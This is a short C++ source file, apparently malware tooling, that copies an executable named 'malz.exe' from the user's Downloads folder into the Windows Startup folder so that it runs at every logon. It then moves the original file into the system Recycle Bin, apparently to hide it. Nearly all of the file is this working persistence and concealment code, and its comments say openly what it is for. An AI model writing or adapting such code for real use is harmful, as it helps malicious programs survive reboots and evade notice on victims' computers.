// Just copies the binary to the Startup directory for persistence purposes.
// Nothing fancy: Just some raw code, no encoding or encryption

#include <iostream>
#include <windows.h>
#include <filesystem>
#include <string.h>
#include <cstdlib>

using namespace std;
namespace fs = filesystem;

string username = getenv("USERNAME");

int main() {
    cout << "Pls no copy pasterino!\n";

    string targetFile = "C:\\Users\\" + username + "\\Downloads\\malz.exe";
    string targetDIR = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malz.exe";

    fs::copy(targetFile, targetDIR);    //copy malz.exe to Startup directory for persistence
    system(("cmd.exe /c move " + targetFile + " C:\\$Recycle.Bin").c_str());    //requires admin privs
    
    return 0;
}
